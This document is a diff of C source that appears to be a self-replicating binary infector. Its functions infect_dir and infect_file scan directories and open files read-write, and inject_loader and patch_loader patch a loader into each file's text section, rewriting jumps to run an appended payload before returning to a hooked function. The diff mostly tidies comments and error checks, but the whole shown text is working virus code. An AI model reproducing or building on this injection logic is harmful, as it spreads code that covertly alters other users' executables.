@@ -13,19 +13,16 @@ static void	patch_loader(t_info *info)
 	int32_t	end;
 	int32_t val;
 
+	// rewrite jmp to payload
 	start = info->text_addr + info->text_size + LOADER_SIZE;
 	end = (int32_t)(info->addr_payload + MAIN_OFFSET);
-	// 	end = (int32_t)(info->addr_payload + (size_t)(&main) - (size_t)(&ft_memcpy));
 	val = end - start;
-
-	// rewrite jmp to payload
 	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE - 4, &val, 4);
 
-	// 	start = info->text_addr + info->text_size + LOADER_SIZE + 44;
+	// rewrite addr for mprotect
 	end = info->addr_payload;
 	val = end - start;
-	// rewrite addr for mprotect
-	ft_memcpy(info->text_begin + info->text_size + 64, &val, 4);
+	ft_memcpy(info->text_begin + info->text_size + 64, &val, 4); // 64 is pos of instruction targeted in loader
 }
 
 static void	inject_loader(t_info *info)
@@ -77,10 +74,6 @@ void	patch_end(t_info *info, int32_t nb)
 	start -= (5 * (nb - 1));
 	end = (int32_t)((size_t)(info->addr_hooked_func) - (size_t)(info->text_begin) + info->text_addr);
 	val = end - start;
-// 	if (nb == 1)
-// 		ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 9, &val, 4);
-// 	if (nb == 2)
-// 		ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 4, &val, 4);
 	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 4 - (5 * (nb - 1)), &val, 4);
 }
 
@@ -100,7 +93,7 @@ static void	patch_addresses(t_info *info)
 
 	// &loader
 	start = info->addr_payload + OFFSET_1 + 4;
-	end = (int32_t)((size_t)(info->text_begin) + (size_t)(info->text_size) - (size_t)(info->file));
+	end = (int32_t)(info->text_addr + info->text_size);
 	val = end - start;
 	ft_memcpy(info->file + info->offset_payload + OFFSET_1, &val, 4);
 
@@ -150,7 +143,7 @@ static void		infect_file(char *path)
 	int				fd;
 	uint32_t		magic;
 	
-	if ((fd = ft_sysopen(path, O_RDWR)) ==  -1)
+	if ((fd = ft_sysopen(path, O_RDWR)) < 0)
 		return ;
 	init_info(&info);
 	ft_sysfstat(fd, &st);
@@ -188,7 +181,7 @@ static int		infect_dir(char *path)
 	char					buf_path_file[PATH_MAX];
 
 	n_read = 0;
-	if ((fd = ft_sysopen(path, O_RDONLY)) == -1)
+	if ((fd = ft_sysopen(path, O_RDONLY)) < 0)
 		return (1);
 	while ((n_read = ft_sysgetdents(fd, buf_d, 1024)) > 0)
 	{
